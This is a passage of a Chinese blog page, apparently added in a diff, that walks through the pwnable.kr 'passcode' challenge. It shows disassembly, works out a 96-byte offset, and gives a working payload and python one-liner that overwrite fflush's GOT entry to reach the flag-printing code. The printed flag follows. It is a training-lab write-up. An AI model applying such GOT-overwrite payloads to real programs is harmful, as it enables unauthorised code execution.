class="number">-0x70</span>(%ebp),%edx</span><br><span class="line"> <span class="number">8048632</span>:	<span class="number">89</span> <span class="number">54</span> <span class="number">24</span> <span class="number">04</span>          	mov    %edx,<span class="number">0x4</span>(%esp)</span><br><span class="line"> <span class="number">8048636</span>:	<span class="number">89</span> <span class="number">04</span> <span class="number">24</span>             	mov    %eax,(%esp)</span><br><span class="line"> <span class="number">8048639</span>:	e8 <span class="number">62</span> fe ff ff       	call   <span class="number">80484</span>a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line"> <span class="number">804863</span>e:	b8 e3 <span class="number">87</span> <span class="number">04</span> <span class="number">08</span>       	mov    $<span class="number">0x80487e3</span>,%eax</span><br><span class="line"> <span class="number">8048643</span>:	<span class="number">8</span>d <span class="number">55</span> <span class="number">90</span>             	lea    <span class="number">-0x70</span>(%ebp),%edx</span><br><span class="line"> <span class="number">8048646</span>:	<span class="number">89</span> <span class="number">54</span> <span class="number">24</span> <span class="number">04</span>          	mov    %edx,<span class="number">0x4</span>(%esp)</span><br><span class="line"> <span class="number">804864</span>a:	<span class="number">89</span> <span class="number">04</span> <span class="number">24</span>             	mov    %eax,(%esp)</span><br><span class="line"> <span class="number">804864</span>d:	e8 ce fd ff ff       	call   <span class="number">8048420</span> &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line"> <span class="number">8048652</span>:	<span class="number">8b</span> <span class="number">45</span> f4             	mov    <span class="number">-0xc</span>(%ebp),%eax</span><br><span class="line"> <span class="number">8048655</span>:	<span class="number">65</span> <span class="number">33</span> <span class="number">05</span> <span class="number">14</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	xor    %gs:<span class="number">0x14</span>,%eax</span><br><span class="line"> <span class="number">804865</span>c:	<span class="number">74</span> <span class="number">05</span>                	je     <span class="number">8048663</span> &lt;welcome+<span class="number">0x5a</span>&gt;</span><br><span class="line"> <span class="number">804865</span>e:	e8 dd fd ff ff       	call   <span class="number">8048440</span> &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> <span class="number">8048663</span>:	c9                   	leave  </span><br><span class="line"> <span class="number">8048664</span>:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<p>passcode1（login函数的反汇编代码可以看出）的位置为ebp-0x10，那么从name到passcode1所占范围为：0x70-0x10=0x60=96，name要求输入100个字节，那么name的最后4个字节就会被当做是passcode1的地址，也就是这里fflush函数的地址。<br>paylode:<br>‘a’*96+p32(fflush_got)+str(sys_addr)<br>‘a’*96+p32(0x0804a004)+str(0x80485e3)</p>
+<p>输入命令：<br> python -c “print ‘A’ * 96 + ‘\x00\xa0\x04\x08’ + ‘134514147\n’” | ./passcode<br>得到flag：Sorry mom.. I got confused about scanf usage :(</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/05/23/pwnable passcode/">pwnable.kr-passcode</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">HANqd</a></p>
+        <p><span>发布时间:</span>2019-05-23, 20:40:09</p>
+        <p><span>最后更新:</span>2019-05-23, 20:41:14</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/05/23/pwnable passcode/" title="pwnable.kr-passcode">https://hanqd.github.io/2019/05/23/pwnable passcode/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://hanqd.github.io/2019/05/23/pwnable passcode/　　作者: HANqd" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/05/22/pwnable flag/">
+                    pwnable.kr-flag
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-kr-passcode"><span class="toc-number">1.</span> <span class="toc-text">pwnable.kr-passcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目描述"><span class="toc-number">1.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析"><span class="toc-number">1.2.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题思路"><span class="toc-number">1.3.</span> <span class="toc-text">解题思路</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"pwnable.kr-passcode　| HANqd's BLOG　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <div id="comment-box"></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2019/05/23/pwnable passcode/" data-title="pwnable.kr-passcode" data-url="https://hanqd.github.io/2019/05/23/pwnable passcode/"></div>
+    <script>
+        var duoshuoQuery = {short_name:""};
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+            s.async = true; s.charset = 'UTF-8';
+            (d.head || d.body).appendChild(s);
+        }
+
+        
+    </script>
+    
+    <script> loadComment(); </script>
+
+</div>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/05/22/pwnable flag/" title="下一篇: pwnable.kr-flag">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/23/pwnable passcode/">pwnable.kr-passcode</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/22/pwnable flag/">pwnable.kr-flag</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/21/pwnable bof/">pwnable.kr-bof</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/19/pwnable-collision/">pwnable.kr-collision</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/18/pwnable-fd/">pwnable.kr-fd</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/10/CSAPP第二章/">CSAPP笔记-第二章 信息的表示和处理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/05/20190505/">CSAPP笔记-第一章 计算机系统漫游</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/29/RSA/">Crypto RSA</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/28/misc realwifi/">Misc Realwifi</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/27/20190427/">恶意软件样本地址集合</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/21/oj web confusion1/">oj Web-Confusion1(SSTI攻击)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/19/oj pwn bof/">oj pwn-bof</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/17/oj XSS/">Web babyXSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/16/php3/">Web：BasicFileInclude</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/15/php2/">Web：Basic PHP2</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/13/oj php1/">Web：Basic PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/13/Sql/">web oj:Basic SQL</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/12/oj Web/">Web calculator+Rapid Typing</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/11/20190411/">Web学习+oj Web</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/10/oj pwn/">pwn题目初尝试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/09/pwn环境搭建/">pwn环境搭建（Ubuntu下）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/09/每日一题1017/">每日一题 1017（大数除法）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/08/每日一题1015 1016/">每日一题1015（结构体+sort排序）+1016</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/07/IDA Pro学习1/">IDA Pro权威指南-第一章 反汇编简介</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/06/每日一题1014/">每日一题 1014</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/05/每日一题1011 1012 1013/">每日一题 1011+1012+1013</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/04/Misc shell/">Misc shell</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/02/每日一题1010/">每日一题 1010</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/02/20190402/">pwn-栈溢出（1）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/01/20190401/">每日一题 1009+vector容器</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/31/每日一题1008/">每日一题 1008+pwn学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/30/每日一题/">每日一题 1007+Misc Another 01Game</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/29/每日一题1006/">每日一题 1006</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/28/Misc Forensics2/">Misc：Forensics2（流量分析题）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/28/每日一题1005/">每日一题 1005</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/28/reverse1/">CTF逆向reverse：Reverse sign in</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/27/每日一题1004/">每日一题 1004</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/Web calculate/">Web calculator</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/每日一题1003/">每日一题 1003</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/18/Python数据类型（整数、浮点数、数据类型转换）/">Python笔记——数据类型（整数、浮点数、数据类型转换）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/17/Python数据类型（字符串）/">Python笔记——数据类型（字符串）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/15/你好，hexo/">你好，hexo</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/15/hello-world/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019 HANqd
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style="display:none">
+                        <span id="page-visit" title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
